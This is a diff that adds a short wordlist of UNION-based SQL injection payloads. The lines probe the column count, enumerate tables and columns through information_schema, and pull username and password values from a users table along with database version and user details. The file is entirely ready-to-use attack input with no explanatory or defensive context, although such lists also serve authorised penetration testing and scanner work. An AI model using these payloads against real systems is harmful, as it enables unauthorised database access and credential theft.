@@ -1,0 +1,15 @@
+# SQL Injection - UNION-Based Payloads
+' UNION SELECT NULL-- -
+' UNION SELECT NULL,NULL-- -
+' UNION SELECT NULL,NULL,NULL-- -
+' UNION SELECT 1,2,3-- -
+' UNION SELECT 1,2,3,4-- -
+' UNION ALL SELECT NULL-- -
+' UNION SELECT 'a',NULL,NULL-- -
+' UNION SELECT NULL,'a',NULL-- -
+' UNION SELECT table_name,NULL FROM information_schema.tables-- -
+' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -
+' UNION SELECT username,password FROM users-- -
+' UNION SELECT @@version,NULL-- -
+' UNION SELECT user(),NULL-- -
+' UNION SELECT database(),NULL-- -
